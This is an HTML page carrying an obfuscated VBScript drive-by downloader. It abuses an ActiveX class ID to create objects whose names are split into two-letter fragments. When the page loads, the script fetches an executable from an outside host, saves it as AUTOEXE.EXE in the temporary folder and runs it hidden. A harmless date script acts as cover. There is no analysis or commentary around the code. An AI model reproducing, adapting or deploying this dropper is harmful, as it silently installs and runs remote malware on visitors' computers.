<html>
<script language="VBScript">
gnwu="Sc"
xvio="ri"
hsxe="pt"
owsd="in"
pckk="g."
gyfw="Fi"
htlq="le"
bovc="Sy"
ysqm="st"
pglu="em"
wern="Ob"
qecf="je"
yirt="ct"
rhbl="Mi"
tnmf="cr"
upqp="os"
fvxl="of"
dare="t."
sbkn="XM"
nola="LH"
hpoh="TT"
wyld="P"
dzne="cl"
egxv="si"
aivs="d:"
sokf="BD"
nlhj="96"
xtbc="C5"
wahp="56"
dclg="-6"
edgq="5A"
ynir="3-"
boag="11"
myja="D0"
yppg="-9"
cylf="83"
qfit="A-"
tcew="00"
vttx="C0"
mrls="4F"
rjvh="C2"
dwyi="9E"
eqnl="36"
wdlk="ob"
pyci="je"
kzbu="ct"
on error resume next
dl ="http://www.5t55.com/mm/5t55.exe"
Set df = document.createElement(wdlk+pyci+kzbu)
df.setAttribute "classid", dzne+egxv+aivs+sokf+nlhj+xtbc+wahp+dclg+edgq+ynir+boag+myja+yppg+cylf+qfit+tcew+vttx+mrls+rjvh+dwyi+eqnl
str=rhbl+tnmf+upqp+fvxl+dare+sbkn+nola+hpoh+wyld
Set x = df.CreateObject(str,"")
a1="Ado"
a2="db."
a3="Str"
a4="eam"
str1=a1&a2&a3&a4
str5=str1
set S = df.createobject(str5,"")
S.type = 1
str6="GET"
x.Open str6, dl, False
x.Send
fname1="AUTOEXE.EXE"
set F = df.createobject(gnwu+xvio+hsxe+owsd+pckk+gyfw+htlq+bovc+ysqm+pglu+wern+qecf+yirt,"")
set tmp = F.GetSpecialFolder(2) 
fname1= F.BuildPath(tmp,fname1)
S.open
S.write x.responseBody
S.savetofile fname1,2
S.close
set Q = df.createobject("Shell.Application","")
Q.ShellExecute fname1,"","","open",0
</script>
<script type="text/jscript">
function init()
{document.write(Date());}
window.onload = init;
</script>
</html>

